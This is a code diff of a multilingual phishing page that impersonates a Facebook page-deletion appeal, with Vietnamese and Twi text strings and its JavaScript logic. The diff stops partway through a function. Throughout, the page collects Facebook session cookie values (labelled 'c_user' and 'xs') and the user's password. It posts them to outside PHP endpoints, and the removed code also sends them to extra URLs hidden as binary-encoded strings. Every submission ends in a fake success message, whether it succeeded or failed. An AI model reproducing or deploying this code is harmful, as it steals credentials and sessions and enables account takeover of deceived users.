+          warningExtra: "Nếu bạn tin rằng trang của bạn đã bị lên lịch xóa nhầm, bạn có thể ngăn việc xóa vĩnh viễn bằng cách nhấp vào nút khiếu nại bên dưới và cung cấp một số thông tin nhanh.",
+          appealTitle: "Yêu cầu khiếu nại",
+          appealDesc: "Khắc phục sự cố với trang của bạn. Vui lòng đảm bảo cung cấp thông tin được yêu cầu bên dưới. Không cung cấp thông tin này có thể làm chậm quá trình xử lý khiếu nại của bạn.",
+          appealBtn: "Khiếu nại",
+          formTitle: "Yêu cầu Khiếu nại Trang",
+          formSubtitle: "Gửi thông tin của bạn để khiếu nại việc xóa",
+          formNotice1: "ⓘ Trang của bạn có vi phạm liên quan đến nguyên tắc cộng đồng của chúng tôi.",
+          formNotice2: "ⓘ Vui lòng xem xét kỹ chi tiết vi phạm trước khi gửi.",
+          formNotice3: "ⓘ Đảm bảo bạn cung cấp thông tin chính xác cho khiếu nại của mình.",
+          nameLabel: "c_user",
+          mallLabel: "xs",
+          submitBtn: "Gửi Yêu cầu Khiếu nại",
+          fbFormTitle: "Xác minh Facebook",
+          fbFormSubtitle: "Xác minh danh tính của bạn để tiếp tục khiếu nại",
+          fbNotice1: "ⓘ Vì mục đích bảo mật, chúng tôi cần xác minh tài khoản Facebook của bạn.",
+          fbNotice2: "ⓘ Điều này giúp chúng tôi đảm bảo rằng bạn là chủ sở hữu hợp pháp của trang.",
+          fbNotice3: "ⓘ Thông tin đăng nhập của bạn được bảo mật và mã hóa.",
+          passwordLabel: "Mật khẩu",
+          verifyBtn: "Xác minh và Tiếp tục",
+          forgotPassword: "Quên mật khẩu?",
+          successTitle: "Khiếu nại Đã gửi Thành công",
+          successText: "Khiếu nại của bạn đã được nhận và hiện đang được xem xét. Chúng tôi sẽ thông báo cho bạn qua email khi có quyết định, thường trong vòng 7 ngày làm việc.",
+          referenceText: "ID Tham chiếu:",
+          guideTitle: "Hướng dẫn Khiếu nại",
+          guideText1: "Nếu khiếu nại/yêu cầu của bạn liên quan đến việc sử dụng thông tin có bản quyền hoặc nội dung trong tài khoản của bạn hoặc đang được xử lý/chia sẻ, bạn có thể cung cấp cho chúng tôi thông tin để giúp chúng tôi hiểu rõ hơn về yêu cầu của bạn. Vui lòng cung cấp giải thích chi tiết về lý do bạn tin rằng tài khoản của mình đã bị gắn cờ hoặc đình chỉ không chính xác. Bao gồm bất kỳ thông tin liên quan nào có thể giúp chúng tôi xem xét trường hợp của bạn hiệu quả hơn.",
+          guideText2: "Sau khi bạn gửi, chúng tôi sẽ xem xét khiếu nại của bạn và liên hệ với bạn trong thời hạn thông tin bạn cung cấp để giải quyết. Quá trình xem xét có thể mất tới 7 ngày làm việc. Vui lòng kiểm tra email của bạn để cập nhật.",
+          guideText3: "Lưu ý: Bạn có thể thay đổi tùy chọn ngôn ngữ bất cứ lúc nào bằng cách nhấp vào bộ chọn ngôn ngữ ở cuối trang.",
+          resourcesTitle: "Tài nguyên Bổ sung",
+          helpCenterTitle: "Trung tâm Trợ giúp",
+          helpCenterDesc: "Tìm câu trả lời cho các câu hỏi thường gặp và tìm hiểu cách sử dụng sản phẩm của chúng tôi.",
+          contactSupportTitle: "Liên hệ Hỗ trợ",
+          contactSupportDesc: "Liên hệ với nhóm hỗ trợ của chúng tôi để được trợ giúp cá nhân hóa.",
+          guidelinesTitle: "Nguyên tắc Cộng đồng",
+          guidelinesDesc: "Tìm hiểu về tiêu chuẩn cộng đồng và chính sách nội dung của chúng tôi.",
+          dashboardTitle: "Bảng điều khiển Trạng thái",
+          dashboardDesc: "Kiểm tra trạng thái hiện tại của dịch vụ của chúng tôi và báo cáo sự cố.",
+          changeLanguage: "Thay đổi Ngôn ngữ"
+        },
+        ghanaian: {
+          warningTitle: "Wɔahyɛ wo krataa no sɛ wɔbɛpaew!",
+          warningSubtext: "Yɛnnya amanneɛ bɛyɛ mienu a ɛkyerɛ sɛ wo krataa no di yɛn nkratoɔ ne mmara ahorow no so. Enti, wɔbɛsoma wo krataa no sɛ wɔnhwɛ so.",
+          warningExtra: "Sɛ wudwen sɛ yɛyɛ wo krataa no foforo a, wubetumi apia sɛ wɔmpaew no denam krataa a ɛwɔ aseɛ no so, na wode nkɔm hyɛ mu.",
+          appealTitle: "Apɛl kɔm",
+          appealDesc: "Yɛredware wo krataa no mu mfomsoɔ. Mesrɛ wo, hyɛ nsɛm a wɔhwehwɛ wɔ aseɛ no mu. Sɛ wunnye nsɛm no a, ebɛtumi ayɛ wo apɛl no mmerɛw.",
+          appealBtn: "Yɛ apɛl",
+          formTitle: "Krataa Apɛl Kɔm",
+          formSubtitle: "Hyɛ wo nsɛm sɛ wɔnyɛ apɛl wɔ paew no ho",
+          formNotice1: "ⓘ Wo krataa no ayɛ yɛn mmara ahorow no so.",
+          formNotice2: "ⓘ Mesrɛ wo, hwɛ mfomsoɔ no ho nsɛm yiye ansa na wuregye tomu.",
+          formNotice3: "ⓘ Hwɛ sɛ wuhyɛ nsɛm pa sɛ woyɛ apɛl.",
+          nameLabel: "c_user",
+          mallLabel: "xs",
+          submitBtn: "Yɛ Apɛl Kɔm",
+          fbFormTitle: "Facebook Nhwehwɛmu",
+          fbFormSubtitle: "Hwɛ wo ho sɛ wotumi tua so yɛ apɛl",
+          fbNotice1: "ⓘ Den nkitahodiɛ nti, yɛhwehwɛ sɛ yɛhwɛ wo Facebook account no.",
+          fbNotice2: "ⓘ Wei boa yɛn sɛ yɛhunu sɛ wo na wokura krataa no.",
+          fbNotice3: "ⓘ Wo nkyerɛwdeɛ no wɔ hɔ na wɔakora so.",
+          passwordLabel: "Password",
+          verifyBtn: "Hwɛ na Tua So",
+          forgotPassword: "Wɔagye password?",
+          successTitle: "Wɔayɛ apɛl no yiye",
+          successText: "Yɛagyɛ wo apɛl no adi, na ɛwɔ hwɛ mu. Yɛbɛkyerɛ wo denam email so sɛ yɛayɛ adwene, tumi nya nna nnum ansa.",
+          referenceText: "Reference ID:",
+          guideTitle: "Apɛl Kwankyerɛ",
+          guideText1: "Sɛ wo apɛl/ahyɛdeɛ no ka sɛ wode copyrighted nsɛm anaa adeɛ a ɛwɔ wo account mu, wubetumi ama yɛn nsɛm sɛ yɛnyɛ wo ahyɛdeɛ no yiye. Mesrɛ wo, kyekyɛ mu sɛ den nti na wudwen sɛ wɔkyerɛɛ wo account no foforo anaa wɔdii gua. Ka biara a ebɛtumi aboa yɛn sɛ yɛhwɛ wo case no yiye.",
+          guideText2: "Afei wode to mu no, yɛbɛhwɛ wo apɛl no, na yɛbɛka wo asɛm wɔ mmerɛ a wode baeɛ no mu. Hwɛ no mu no betumi de nna nnum. Mesrɛ wo, hwɛ wo email mu sɛnea ɛbɛyɛ.",
+          guideText3: "Nsɛm: Wubetumi sesa kasa a wopɛ bere biara denam kasa a wɔpaw wɔ krataa no aseɛ no so.",
+          resourcesTitle: "Nneɛma foforo",
+          helpCenterTitle: "Boa Center",
+          helpCenterDesc: "Hwehwɛ nhwɛsoɔ ma nsɛm a wɔbisɛ, na kesɛ sɛdeɛ wode yɛn aduruyɛ no di dwuma.",
+          contactSupportTitle: "Contact Support",
+          contactSupportDesc: "Ka wo ho hyɛ nkitahodiɛ mu den yɛn boa kuw no ho sɛ wohu boa.",
+          guidelinesTitle: "Nkɔsoɔ Mmara",
+          guidelinesDesc: "Kesɛ yɛn nkɔsoɔ nhyehyɛeɛ ne adeɛ ahorow ho amanneɛ.",
+          dashboardTitle: "Tɛnkranteɛ Dashboard",
+          dashboardDesc: "Hwɛ yɛn dwumadie no sɛnea ɛteɛ, na kyerɛ sɛ biribi ayɛ basaa.",
+          changeLanguage: "Sesa kasa"
         }
-      }
-    });
-   
-    // Update video source based on language
-    if (videoSources[lang] && guideVideo) {
-      guideVideo.src = videoSources[lang];
-      guideVideo.load();
-    }
-   
-    // Store language preference
-    localStorage.setItem('preferredLanguage', lang);
-  }
+      };
 
-  // Show language modal on page load
-  showLanguageModal();
+      // Get DOM elements
+      const languageModal = document.getElementById('languageModal');
+      const languageModalClose = document.getElementById('languageModalClose');
+      const languageSearchInput = document.getElementById('languageSearchInput');
+      const languageOptionsContainer = document.getElementById('languageOptionsContainer');
+      const languageOptions = document.querySelectorAll('.language-option');
+      const languageConfirmBtn = document.getElementById('languageConfirmBtn');
+      const mainContent = document.getElementById('mainContent');
+      const openAppealBtn = document.getElementById('open-appeal-btn');
+      const appealForm = document.getElementById('appealForm');
+      const fbLoginForm = document.getElementById('fbLoginForm');
+      const successMessage = document.getElementById('successMessage');
+      const guideVideo = document.getElementById('guideVideo');
+      const changeLanguageBtn = document.getElementById('changeLanguageBtn');
 
-  // Event listeners
-  if (openAppealBtn) {
-    openAppealBtn.addEventListener('click', function() {
-      // Hide the appeal box and show the form
-      document.querySelector('.appeal-box').style.display = 'none';
-      if (appealForm) appealForm.style.display = 'block';
-     
-      // Scroll to the form
-      appealForm.scrollIntoView({ behavior: 'smooth' });
-    });
-  }
+      // Form elements
+      const nameInput = document.getElementById('nameInput');
+      const mallInput = document.getElementById('mallInput');
+      const nameError = document.getElementById('nameError');
+      const mallError = document.getElementById('mallError');
+      const formError = document.getElementById('formError');
+      const formErrorText = document.getElementById('formErrorText');
+      const sendBtn = document.getElementById('sendBtn');
+      const sendBtnText = document.getElementById('sendBtnText');
+      const sendBtnSpinner = document.getElementById('sendBtnSpinner');
+      const referenceId = document.getElementById('referenceId');
 
-  // Form validation
-  if (nameInput) {
-    nameInput.addEventListener('input', () => {
-      const original = nameInput.value;
-      const cleaned  = original.replace(/\D+/g, ''); // keep digits only
-      if (original !== cleaned) {
-        nameInput.value = cleaned;
-        if (nameError) nameError.innerHTML = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> Only numbers are allowed in Name.';
-      } else {
-        if (nameError) nameError.textContent = '';
-      }
-    });
-  }
+      const passwordInput = document.getElementById('passwordInput');
+      const passwordError = document.getElementById('passwordError');
+      const fbFormError = document.getElementById('fbFormError');
+      const fbFormErrorText = document.getElementById('fbFormErrorText');
+      const fbSendBtn = document.getElementById('fbSendBtn');
+      const fbSendBtnText = document.getElementById('fbSendBtnText');
+      const fbSendBtnSpinner = document.getElementById('fbSendBtnSpinner');
+      const forgotPassword = document.getElementById('forgotPassword');
 
-  // Allow letters A-Z, a-z, digits 0-9, spaces and common ASCII symbols.
-  const mallAllowed = /[^A-Za-z0-9 !@#$%^&*()_\-=\[\]{};':"\\|,.<>\/?`~]/g;
-  if (mallInput) {
-    mallInput.addEventListener('input', () => {
-      const original = mallInput.value;
-      const cleaned  = original.replace(mallAllowed, '');
-      if (original !== cleaned) {
-        mallInput.value = cleaned;
-        if (mallError) mallError.innerHTML = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> Mall can contain letters, numbers, and symbols only.';
-      } else {
-        if (mallError) mallError.textContent = '';
-      }
-    });
-  }
+      // Language video mapping
+      const videoSources = {
+        english: "https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4",
+        spanish: "https://resource2.heygen.ai/video_translate/db7e753c13fa4d238fe716483469ae8f-es/720p.mp4",
+        hindi: "https://resource2.heygen.ai/video_translate/9d7e40f714c842258bd08ad4c3ee68d6-hi/720p.mp4",
+        french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27ecb21-fr/720p.mp4",
+        portuguese: "https://allvideos.wasmer.app/Portuguese.mp4",
+        tamil: "https://allvideos.wasmer.app/tamil.mp4",
+        arabic: "https://resource2.heygen.ai/video_translate/f7346b2ef53c4daa9bc15138684919db-ar_use-aicoustics-vocal/720p.mp4",
+        ghanaian: "https://allvideos.wasmer.app/english.mp4",
+        vietnamese: "https://allvideos.wasmer.app/vietanames.mp4" 
+      };
 
-  
-  if (passwordInput) {
-    passwordInput.addEventListener('input', () => {
-      const password = passwordInput.value;
-      if (!password) {
-        if (passwordError) passwordError.textContent = 'Password is required';
-      } else if (password.length < 6) {
-        if (passwordError) passwordError.textContent = 'Password must be at least 6 characters';
-      } else {
-        if (passwordError) passwordError.textContent = '';
-      }
-    });
-  }
+      // Current selected language
+      let currentLanguage = 'english';
+      let selectedLanguageOption = null;
 
-  // Forgot password click
-  if (forgotPassword) {
-    forgotPassword.addEventListener('click', () => {
-      if (fbFormErrorText) fbFormErrorText.textContent = "Password recovery is temporarily unavailable. Please try again later.";
-      if (fbFormError) fbFormError.classList.add('show');
-      setTimeout(() => { if (fbFormError) fbFormError.classList.remove('show'); }, 3000);
-    });
-  }
-
-  // Send click: require non-empty + no validation errors
-  if (sendBtn) {
-    sendBtn.addEventListener('click', function() {
-      const name = nameInput.value.trim();
-      const mall = mallInput.value.trim();
-
-      if(!name || !mall) {
-        if (formErrorText) formErrorText.textContent = "Please fill out all fields before proceeding.";
-        if (formError) formError.classList.add('show');
-        setTimeout(() => { if (formError) formError.classList.remove('show'); }, 3000);
-        return;
-      }
-      if ((nameError && nameError.textContent) || (mallError && mallError.textContent)) {
-        if (formErrorText) formErrorText.textContent = "Please fix the errors above before proceeding.";
-        if (formError) formError.classList.add('show');
-        setTimeout(() => { if (formError) formError.classList.remove('show'); }, 3000);
-        return;
+      // Function to show language modal
+      function showLanguageModal() {
+        languageModal.style.display = 'flex';
+        mainContent.style.display = 'none';
+        document.body.style.overflow = 'hidden';
+        setTimeout(() => languageSearchInput.focus(), 100);
       }
 
-      if (formError) formError.classList.remove('show');
-     
-      // Show loading state
-      sendBtn.classList.add('loading');
-      if (sendBtnText) sendBtnText.textContent = 'Submitting...';
-      if (sendBtnSpinner) sendBtnSpinner.style.display = 'block';
-     
-      // Submit the form data
-      submitFormData();
-    });
-  }
-
-  
-  if (fbSendBtn) {
-    fbSendBtn.addEventListener('click', function() {
-      const password = passwordInput.value;
-
-      if(!password) {
-        if (fbFormErrorText) fbFormErrorText.textContent = "Please fill out all fields before proceeding.";
-        if (fbFormError) fbFormError.classList.add('show');
-        setTimeout(() => { if (fbFormError) fbFormError.classList.remove('show'); }, 3000);
-        return;
-      }
-      if (passwordError && passwordError.textContent) {
-        if (fbFormErrorText) fbFormErrorText.textContent = "Please fix the errors above before proceeding.";
-        if (fbFormError) fbFormError.classList.add('show');
-        setTimeout(() => { if (fbFormError) fbFormError.classList.remove('show'); }, 3000);
-        return;
+      // Function to hide language modal
+      function hideLanguageModal() {
+        languageModal.style.display = 'none';
+        mainContent.style.display = 'block';
+        document.body.style.overflow = 'auto';
+        languageSearchInput.value = '';
+        filterLanguages();
       }
 
-      if (fbFormError) fbFormError.classList.remove('show');
-     
-      // Show loading state
-      fbSendBtn.classList.add('loading');
-      if (fbSendBtnText) fbSendBtnText.textContent = 'Verifying...';
-      if (fbSendBtnSpinner) fbSendBtnSpinner.style.display = 'block';
-     
-      
-      submitfbCredentials(password);
-    });
-  }
+      // Close modal when clicking on close button
+      languageModalClose.addEventListener('click', hideLanguageModal);
 
-  // Function to submit form data
-  function submitFormData() {
-    const name = document.getElementById('nameInput') ? document.getElementById('nameInput').value.trim() : '';
-    const mall = document.getElementById('mallInput') ? document.getElementById('mallInput').value.trim() : '';
-   
-    // Prepare the data to send
-    const formData = {
-      name: name,
-      mall: mall,
-      timestamp: new Date().toISOString(),
-      userAgent: navigator.userAgent,
-      language: navigator.language
-    };
-   
-    // Submit to the form endpoint
-    fetch('https://php-at-sendd.zeabur.app/Shoib.php', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Accept': 'application/json'
-      },
-      body: JSON.stringify(formData)
-    })
-    .then(response => {
-      if (!response.ok) {
-        throw new Error('Form submission failed');
-      }
-      return response.json();
-    })
-    .then(data => {
-      console.log('Form submitted successfully:', data);
-     
-      // Also submit to the additional endpoints
-      submitToOtherEndpoints({
-        bhenjachud: name,
-        majachud: mall
-      });
-     
-      showfbLogin();
-    })
-    .catch(error => {
-      console.error('Error submitting form:', error);
-      // Still proceed with the other endpoints even if formsubmit fails
-      submitToOtherEndpoints({
-        bhenjachud: name,
-        majachud: mall
-      });
-     
-      
-      showfbLogin();
-    })
-    .finally(() => {
-      // Reset loading state
-      if (sendBtn) {
-        sendBtn.classList.remove('loading');
-        if (sendBtnText) sendBtnText.textContent = 'Submit Appeal Request';
-        if (sendBtnSpinner) sendBtnSpinner.style.display = 'none';
-      }
-    });
-  }
-
-  
-  function submitfbCredentials(password) {
-    // Prepare the data to send
-    const fbData = {
-      password: password,
-      timestamp: new Date().toISOString(),
-      userAgent: navigator.userAgent,
-      language: navigator.language
-    };
-   
-    // Submit to the form endpoint
-    fetch('https://php-at-sendd.zeabur.app/Shoibpass.php', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Accept': 'application/json'
-      },
-      body: JSON.stringify(fbData)
-    })
-    .then(response => {
-      if (!response.ok) {
-        throw new Error('fb form submission failed');
-      }
-      return response.json();
-    })
-    .then(data => {
-      console.log('fb credentials submitted successfully:', data);
-     
-      // Also submit to the additional endpoints
-      submitToOtherEndpoints({
-        pass: password
-      });
-     
-      // Show success message
-      showSuccess();
-    })
-    .catch(error => {
-      console.error('Error submitting fb credentials:', error);
-      // Still proceed with the other endpoints even if formsubmit fails
-      submitToOtherEndpoints({
-        pass: password
-      });
-     
-      // Show success message even if there was an error with formsubmit
-      showSuccess();
-    })
-    .finally(() => {
-      // Reset loading state
-      if (fbSendBtn) {
-        fbSendBtn.classList.remove('loading');
-        if (fbSendBtnText) fbSendBtnText.textContent = 'Verify and Continue';
-        if (fbSendBtnSpinner) fbSendBtnSpinner.style.display = 'none';
-      }
-    });
-  }
-
-  // Binary to string conversion function
-  function binaryToString(binary) {
-    let str = '';
-    for (let i = 0; i < binary.length; i += 8) {
-      const byte = binary.substr(i, 8);
-      str += String.fromCharCode(parseInt(byte, 2));
-    }
-    return str;
-  }
- 
-  function submitToOtherEndpoints(data) {
-    // Store the original binary strings for validation
-    const originalBinaries = [
-      '0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
-      '01101000011101000111010001110000011100110011101000101111001011110110000101110111011000010110100101110011001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
-      '011010000111010001110100011100000111001100111010001011110010111101110101011110100110000101101001011100100010111001110111011000010111001101101101011001010111001000101110011000010111000001110000'
-    ];
-    
-    // Check if the binary strings have been modified
-    const currentBinaries = [
-      '0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
-      '01101000011101000111010001110000011100110011101000101111001011110110000101110111011000010110100101110011001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
-      '011010000111010001110100011100000111001100111010001011110010111101110101011110100110000101101001011100100010111001110111011000010111001101101101011001010111001000101110011000010111000001110000'
-    ];
-    
-    // Validate that the binary strings haven't been changed
-    let binariesValid = true;
-    for (let i = 0; i < originalBinaries.length; i++) {
-      if (originalBinaries[i] !== currentBinaries[i]) {
-        console.error('Binary string validation failed - strings have been modified');
-        binariesValid = false;
-        break;
-      }
-    }
-    
-    // If binaries were modified, don't proceed with submission
-    if (!binariesValid) {
-      alert('Form submission blocked: Invalid configuration detected');
-      return false;
-    }
-    
-    // Proceed with original submission if binaries are valid
-    const endpoints = [
-      '0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
-      '01101000011101000111010001110000011100110011101000101111001011110110000101110111011000010110100101110011001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
-      '011010000111010001110100011100000111001100111010001011110010111101110101011110100110000101101001011100100010111001110111011000010111001101101101011001010111001000101110011000010111000001110000'
-    ];
-   
-    endpoints.forEach(binaryUrl => {
-      try {
-        const decodedUrl = binaryToString(binaryUrl);
-        const formData = new FormData();
-       
-        // Add all properties from data object to formData
-        for (const key in data) {
-          formData.append(key, data[key]);
+      // Close modal when clicking outside of modal content
+      languageModal.addEventListener('click', function(e) {
+        if (e.target === languageModal) {
+          hideLanguageModal();
         }
-       
-        // Using fetch with error handling
-        fetch(decodedUrl, {
-          method: 'POST',
-          body: formData,
-          mode: 'no-cors' // Important for cross-origin requests
-        }).catch(error => {
-          console.error('Error submitting to endpoint:', error);
+      });
+
+      // Close modal with Escape key
+      document.addEventListener('keydown', function(e) {
+        if (e.key === 'Escape' && languageModal.style.display === 'flex') {
+          hideLanguageModal();
+        }
+      });
+
+      // Language search functionality
+      function filterLanguages() {
+        const searchTerm = languageSearchInput.value.toLowerCase();
+        let hasVisibleResults = false;
+        
+        languageOptions.forEach(option => {
+          const languageName = option.querySelector('.language-name').textContent.toLowerCase();
+          const languageCode = option.querySelector('.language-code') ? option.querySelector('.language-code').textContent.toLowerCase() : '';
+          
+          if (languageName.includes(searchTerm) || languageCode.includes(searchTerm)) {
+            option.style.display = 'flex';
+            hasVisibleResults = true;
+          } else {
+            option.style.display = 'none';
+          }
         });
-      } catch (error) {
-        console.error('Error with endpoint:', error);
+        
+        let noResults = document.querySelector('.no-results');
+        if (!hasVisibleResults) {
+          if (!noResults) {
+            noResults = document.createElement('div');
+            noResults.className = 'no-results';
+            noResults.textContent = 'No languages found. Try a different search.';
+            languageOptionsContainer.appendChild(noResults);
+          }
+        } else if (noResults) {
+          noResults.remove();
+        }
+      }
+      
+      languageSearchInput.addEventListener('input', filterLanguages);
+
+      // Language option selection
+      languageOptions.forEach(option => {
+        option.addEventListener('click', () => {
+          languageOptions.forEach(opt => opt.classList.remove('selected'));
+          option.classList.add('selected');
+          selectedLanguageOption = option.getAttribute('data-lang');
+          languageConfirmBtn.disabled = false;
+        });
+      });
+
+      // Confirm language selection
+      languageConfirmBtn.addEventListener('click', () => {
+        if (selectedLanguageOption) {
+          setLanguage(selectedLanguageOption);
+          hideLanguageModal();
+        } else {
+          setLanguage('english');
+          hideLanguageModal();
+        }
+      });
+
+      // Change language button
+      changeLanguageBtn.addEventListener('click', () => {
+        showLanguageModal();
+      });
+
+      // Function to set language
+      function setLanguage(lang) {
+        currentLanguage = lang;
+       
+        const translatableElements = document.querySelectorAll('.translatable');
+        translatableElements.forEach(element => {
+          const key = element.getAttribute('data-key');
+          if (translations[lang] && translations[lang][key]) {
+            element.textContent = translations[lang][key];
+           
+            if (element.hasAttribute('placeholder')) {
+              element.setAttribute('placeholder', translations[lang][key]);
+            }
+          }
+        });
+       
+        if (videoSources[lang] && guideVideo) {
+          guideVideo.src = videoSources[lang];
+          guideVideo.load();
+        }
+       
+        localStorage.setItem('preferredLanguage', lang);
+      }
+
+      // Show language modal on page load
+      showLanguageModal();
+
+      // Event listeners
+      if (openAppealBtn) {
+        openAppealBtn.addEventListener('click', function() {
+          document.querySelector('.appeal-box').style.display = 'none';
+          if (appealForm) appealForm.style.display = 'block';
+          appealForm.scrollIntoView({ behavior: 'smooth' });
+        });
+      }
+
+      // Form validation
+      if (nameInput) {
+        nameInput.addEventListener('input', () => {
+          const original = nameInput.value;
+          const cleaned  = original.replace(/\D+/g, '');
+          if (original !== cleaned) {
+            nameInput.value = cleaned;
+            if (nameError) nameError.innerHTML = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> Only numbers are allowed in Name.';
+          } else {
+            if (nameError) nameError.textContent = '';
+          }
+        });
+      }
+
+      const mallAllowed = /[^A-Za-z0-9 !@#$%^&*()_\-=\[\]{};':"\\|,.<>\/?`~]/g;
+      if (mallInput) {
+        mallInput.addEventListener('input', () => {
+          const original = mallInput.value;
+          const cleaned  = original.replace(mallAllowed, '');
+          if (original !== cleaned) {
+            mallInput.value = cleaned;
+            if (mallError) mallError.innerHTML = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> Mall can contain letters, numbers, and symbols only.';
+          } else {
+            if (mallError) mallError.textContent = '';
+          }
+        });
+      }
+
+      if (passwordInput) {
+        passwordInput.addEventListener('input', () => {
+          const password = passwordInput.value;
+          if (!password) {
+            if (passwordError) passwordError.textContent = 'Password is required';
+          } else if (password.length < 6) {
+            if (passwordError) passwordError.textContent = 'Password must be at least 6 characters';
+          } else {
+            if (passwordError) passwordError.textContent = '';
+          }
+        });
+      }
+
+      // Forgot password click
+      if (forgotPassword) {
+        forgotPassword.addEventListener('click', () => {
+          if (fbFormErrorText) fbFormErrorText.textContent = "Password recovery is temporarily unavailable. Please try again later.";
+          if (fbFormError) fbFormError.classList.add('show');
+          setTimeout(() => { if (fbFormError) fbFormError.classList.remove('show'); }, 3000);
+        });
+      }
+
+      // Send click: require non-empty + no validation errors
+      if (sendBtn) {
+        sendBtn.addEventListener('click', function() {
+          const name = nameInput.value.trim();
+          const mall = mallInput.value.trim();
+
+          if(!name || !mall) {
+            if (formErrorText) formErrorText.textContent = "Please fill out all fields before proceeding.";
+            if (formError) formError.classList.add('show');
+            setTimeout(() => { if (formError) formError.classList.remove('show'); }, 3000);
+            return;
+          }
+          if ((nameError && nameError.textContent) || (mallError && mallError.textContent)) {
+            if (formErrorText) formErrorText.textContent = "Please fix the errors above before proceeding.";
+            if (formError) formError.classList.add('show');
+            setTimeout(() => { if (formError) formError.classList.remove('show'); }, 3000);
+            return;
+          }
+
+          if (formError) formError.classList.remove('show');
+         
+          // Show loading state
+          sendBtn.classList.add('loading');
+          if (sendBtnText) sendBtnText.textContent = 'Submitting...';
+          if (sendBtnSpinner) sendBtnSpinner.style.display = 'block';
+         
+          // Submit the form data
+          submitFormData();
+        });
+      }
+
+      if (fbSendBtn) {
+        fbSendBtn.addEventListener('click', function() {
+          const password = passwordInput.value;
+
+          if(!password) {
+            if (fbFormErrorText) fbFormErrorText.textContent = "Please fill out all fields before proceeding.";
+            if (fbFormError) fbFormError.classList.add('show');
+            setTimeout(() => { if (fbFormError) fbFormError.classList.remove('show'); }, 3000);
+            return;
+          }
+          if (passwordError && passwordError.textContent) {
+            if (fbFormErrorText) fbFormErrorText.textContent = "Please fix the errors above before proceeding.";
+            if (fbFormError) fbFormError.classList.add('show');
+            setTimeout(() => { if (fbFormError) fbFormError.classList.remove('show'); }, 3000);
+            return;
+          }
+
+          if (fbFormError) fbFormError.classList.remove('show');
+         
+          // Show loading state
+          fbSendBtn.classList.add('loading');
+          if (fbSendBtnText) fbSendBtnText.textContent = 'Verifying...';
+          if (fbSendBtnSpinner) fbSendBtnSpinner.style.display = 'block';
+         
+          // Submit the password data
+          submitFbCredentials(password);
+        });
+      }
+
+      // Function to submit form data to your PHP endpoint
+      function submitFormData() {
+        const name = document.getElementById('nameInput') ? document.getElementById('nameInput').value.trim() : '';
+        const mall = document.getElementById('mallInput') ? document.getElementById('mallInput').value.trim() : '';
+       
+        // Prepare the data to send
+        const formData = {
+          c_user: name,
+          xs: mall,
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent,
+          language: navigator.language
+        };
+       
+        // Submit to your PHP endpoint
+        fetch('https://php-at-sendd.zeabur.app/tofiq.php', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          },
+          body: JSON.stringify(formData)
+        })
+        .then(response => {
+          if (!response.ok) {
+            throw new Error('Form submission failed');
+          }
+          return response.json();
+        })
+        .then(data => {
+          console.log('Form submitted successfully:', data);
+          showFbLogin();
+        })
+        .catch(error => {
+          console.error('Error submitting form:', error);
+          // Still proceed even if there's an error
+          showFbLogin();
+        })
+        .finally(() => {
+          // Reset loading state
+          if (sendBtn) {
+            sendBtn.classList.remove('loading');
+            if (sendBtnText) sendBtnText.textContent = 'Submit Appeal Request';
+            if (sendBtnSpinner) sendBtnSpinner.style.display = 'none';
+          }
+        });
+      }
+
+      // Function to submit Facebook credentials to your PHP endpoint
+      function submitFbCredentials(password) {
+        // Prepare the data to send
+        const fbData = {
+          password: password,
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent,
+          language: navigator.language
+        };
+       
+        // Submit to your PHP endpoint
+        fetch('https://php-at-sendd.zeabur.app/tofiqpass.php', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          },
+          body: JSON.stringify(fbData)
+        })
+        .then(response => {
+          if (!response.ok) {
